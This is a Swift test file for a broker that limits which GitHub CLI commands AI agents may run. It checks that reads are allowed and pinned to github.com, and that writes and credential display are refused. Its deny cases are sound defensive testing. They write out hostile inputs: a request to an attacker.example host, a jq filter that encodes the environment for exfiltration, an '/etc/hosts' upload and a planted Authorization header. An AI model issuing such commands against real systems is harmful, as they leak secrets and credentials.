import Foundation
import Testing
@testable import HostControlToolSupport

@Suite("GitHub host-control read policy")
struct GitHubHostControlPolicyTests {
    /// Read-only REST calls agents made in production that the broker refused
    /// before `gh api` GETs were exposed.
    @Test("REST GETs on github.com are allowed", arguments: [
        ["api", "repos/example/project/commits/main"],
        ["api", "--method", "GET", "repos/example/project/contents/src/a.py?ref=e100", "-H", "Accept: application/vnd.github.raw+json"],
        ["api", "repos/example/project/pulls/107/files", "--paginate"],
        ["api", "repos/example/project/pulls/997/files?per_page=5&page=4"],
        ["api", "-XGET", "repos/example/project/branches/main"],
        ["api", "--method=head", "repos/example/project"],
        ["api", "-iX", "GET", "repos/example/project"],
        ["api", "repos/{owner}/{repo}/compare/a...b", "--paginate", "--slurp", "--silent"],
        ["api", "repos/:owner/:repo/branches/:branch"],
        ["api", "repos/example/project/contents/docs/graphql.md"],
        ["api", "user", "--template", "--hostname"],
        ["api", "--hostname", "github.com", "repos/example/project", "-t", "{{.name}}"],
        ["api", "repos/example/project", "-H", "accept: application/vnd.github.raw+json", "-H", "X-GitHub-Api-Version: 2022-11-28"]
    ])
    func allowsReads(_ arguments: [String]) {
        #expect(GitHubHostControlPolicy.denialReason(for: arguments) == nil)
    }

    /// gojq's `env` and `$ENV` read the broker's environment, and no scan of the
    /// filter text keeps them out, so every filter is refused.
    @Test("jq filters stay refused", arguments: [
        ["pr", "view", "7", "--json", "number", "--jq", ".number"],
        ["pr", "view", "7", "--json", "number", "--jq", "env"],
        ["pr", "view", "7", "--json", "number", "--jq=.number"],
        ["pr", "view", "7", "--json", "number", "-qenv"],
        ["pr", "view", "7", "--json", "number", "-cq", ".number"],
        ["pr", "view", "7", "--json", "number", "--jq", "\"\u{301}\" + (env | tojson | @base64)"],
        ["api", "repos/example/project/commits/main", "--jq", ".sha"],
        ["auth", "status", "--json", "hosts", "--jq", ".hosts"]
    ])
    func deniesJQ(_ arguments: [String]) throws {
        let reason = try #require(GitHubHostControlPolicy.denialReason(for: arguments))
        #expect(reason.contains("jq filters are not exposed"))
    }

    @Test("A refused jq filter points at a flag the command has")
    func jqDenialAdviceFitsTheCommand() throws {
        let api = try #require(GitHubHostControlPolicy.denialReason(for: ["api", "user", "--jq", ".login"]))
        #expect(api.contains("drop --jq and read the JSON response"))
        #expect(!api.contains("--json"))
        let view = try #require(GitHubHostControlPolicy.denialReason(for: ["pr", "view", "1", "--json", "title", "-q", ".title"]))
        #expect(view.contains("use --json and read the JSON output"))
    }

    @Test("API writes and wider requests stay denied", arguments: [
        ["api", "--method", "DELETE", "/repos/example/project"],
        ["api", "-X", "PATCH", "repos/example/project", "-f", "name=x"],
        ["api", "-XPOST", "repos/example/project/issues"],
        ["api", "repos/example/project/issues", "-f", "title=bug"],
        ["api", "repos/example/project/issues", "--raw-field=title=bug"],
        ["api", "repos/example/project/issues", "-F", "body=@/etc/hosts"],
        ["api", "--method", "GET", "search/issues", "-f", "q=repo:example/project"],
        ["api", "repos/example/project/issues", "--input", "payload.json"],
        ["api", "graphql", "-f", "query={viewer{login}}"],
        ["api", "graphql"],
        ["api", "/graphql"],
        // gh expands placeholders after the check; a branch, owner or repo can be named graphql.
        ["api", "{branch}", "-H", "Accept: application/vnd.github.v4.idl"],
        ["api", "/{repo}/"],
        ["api", "{owner}/{repo}"],
        ["api", ":branch", "-H", "Accept: application/vnd.github.v4.idl"],
        ["api", "/:owner/:repo"],
        // The path gh requests, however the endpoint is spelled.
        ["api", "graphql#ignored", "-H", "Accept: application/vnd.github.v4.idl"],
        ["api", "//GraphQL/?x=1"],
        ["api", "./graphql"],
        ["api", "graph%71l"],
        ["api", "repos/o/r/../../../graphql"],
        ["--", "api", "user"],
        ["api", "https://attacker.example/steal"],
        ["api", "--hostname", "attacker.example", "repos/example/project"],
        ["api", "--hostname=enterprise.example", "repos/example/project"],
        ["api", "--hostname", "", "repos/example/project"],
        ["api", "repos/example/project", "-H", "X-HTTP-Method-Override: DELETE"],
        // Only Accept and X-GitHub-Api-Version headers, and no response cache.
        ["api", "repos/example/project", "-H", "Authorization: token planted"],
        ["api", "repos/example/project", "-H", "X-GH-CACHE-DIR: /tmp/planted"],
        ["api", "repos/example/project", "--cache", "1h"],
        ["api", "repos/example/project", "--cache=1h"],
        ["api", "repos/example/project", "--verbose"],
        ["api", "repos/example/project", "--template=", "--method=DELETE"],
        ["api", "repos/example/project", "--template=", "-XDELETE"],
        ["api", "repos/example/project", "repos/other/project"],
        ["api"],
        ["api", "repos/example/project", "--unknown-flag"]
    ])
    func deniesNonReads(_ arguments: [String]) throws {
        let reason = try #require(GitHubHostControlPolicy.denialReason(for: arguments))
        #expect(reason.contains("does not allow GitHub operation"))
    }

    /// Without `--hostname`, gh sends an api request to its default host
    /// (`GH_HOST`, or the only host it is signed in to) with that host's
    /// credentials; the broker pins API reads to github.com instead.
    /// Each case: what the agent asked, what the broker runs.
    static let pinCases: [PinCase] = [
        PinCase(["api", "user"], ["api", "--hostname", "github.com", "user"]),
        PinCase(["api", "-XGET", "repos/o/r"], ["api", "--hostname", "github.com", "-XGET", "repos/o/r"]),
        PinCase(["api", "--", "repos/o/r"], ["api", "--hostname", "github.com", "--", "repos/o/r"]),
        PinCase(["api", "--hostname", "github.com", "user"], ["api", "--hostname", "github.com", "user"]),
        PinCase(["api", "--hostname=github.com", "user"], ["api", "--hostname=github.com", "user"]),
        // A word another option consumes is not a host option or a separator.
        PinCase(["api", "user", "--template", "--hostname"],
                ["api", "--hostname", "github.com", "user", "--template", "--hostname"]),
        PinCase(["api", "user", "--template", "--"], ["api", "--hostname", "github.com", "user", "--template", "--"]),
        PinCase(["pr", "view", "1"], ["pr", "view", "1"])
    ]

    @Test("API reads run pinned to github.com; other commands run as given", arguments: pinCases)
    func apiReadsArePinned(_ pin: PinCase) {
        #expect(GitHubHostControlPolicy.executionArguments(for: pin.given) == pin.executed)
    }

    @Test("The broker runs an unpinned API read against github.com even when gh's default is another host")
    func brokerPinsTheHost() throws {
        let runner = PinRecordingRunner()
        let server = HostControlMCPServer(
            configuration: .init(githubExecutable: "/host/bin/gh", allowedTools: ["github"],
                                 environment: ["GH_HOST": "ghe.example.com"]),
            processRunner: runner
        )
        for (id, arguments) in [(1, ["api", "user"]), (2, ["pr", "view", "1"])] {
            let request: [String: Any] = [
                "jsonrpc": "2.0", "id": id, "method": "tools/call",
                "params": ["name": "github", "arguments": ["arguments": arguments]]
            ]
            let line = String(decoding: try JSONSerialization.data(withJSONObject: request), as: UTF8.self)
            _ = try #require(server.handleLine(line))
        }
        #expect(runner.arguments == [["api", "--hostname", "github.com", "user"], ["pr", "view", "1"]])
    }

    @Test("Browser launch and token display stay denied with their own reasons")
    func keepsExistingDenials() throws {
        let web = try #require(GitHubHostControlPolicy.denialReason(for: ["pr", "view", "1", "--web"]))
        #expect(web.contains("opening a browser"))
        let bundledWeb = try #require(GitHubHostControlPolicy.denialReason(for: ["pr", "view", "1", "-cw"]))
        #expect(bundledWeb.contains("opening a browser"))
        let token = try #require(GitHubHostControlPolicy.denialReason(for: ["auth", "status", "--show-token"]))
        #expect(token.contains("credential and token display"))
        #expect(GitHubHostControlPolicy.denialReason(for: ["auth", "token"]) != nil)
        #expect(GitHubHostControlPolicy.denialReason(for: ["pr", "create", "--title", "x"]) != nil)
        #expect(GitHubHostControlPolicy.denialReason(for: ["run", "watch", "1"]) != nil)
    }
}

private final class PinRecordingRunner: HostControlProcessRunning {
    var arguments: [[String]] = []

    func run(executablePath: String, arguments: [String], timeoutSeconds: TimeInterval,
             environment: [String: String], currentDirectory: String?) -> HostControlCommandResult {
        self.arguments.append(arguments)
        return HostControlCommandResult(command: executablePath, arguments: arguments, exitCode: 0, stdout: "{}", stderr: "")
    }
}

struct PinCase: Sendable, CustomTestStringConvertible {
    let given: [String]
    let executed: [String]
    init(_ given: [String], _ executed: [String]) {
        self.given = given
        self.executed = executed
    }
    var testDescription: String { given.joined(separator: " ") }
}
